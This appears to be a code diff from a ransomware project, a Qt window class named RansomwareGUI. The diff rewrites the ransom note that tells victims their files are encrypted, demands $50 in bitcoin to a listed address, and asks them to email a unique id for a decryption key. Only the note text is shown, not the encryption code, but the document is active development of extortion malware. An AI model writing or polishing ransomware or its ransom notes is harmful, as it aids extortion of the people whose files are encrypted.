@@ -230,11 +230,12 @@ class RansomwareGUI(QMainWindow):
         # Define ransom note
         self.ransomNote = f"""
         All Your Files Have Been Encrypted\n
-        At the end of the day we just want to get paid\n
-        Here are the instructions to get getting your files back\n
+        At the end of the day weve decided you need to\n
+        pay the piper.
+        Here are the instructions to get your files back\n
         1. Pay $50 btc to the listed address\n
         2. Send an email and include your unique id\n
-        3. Wait\n
+        3. Wait for your decryption key!\n
         ------------------------------------\n
         Check your desktop for readme.txt if you are lost!\n
         ------------------------------------\n
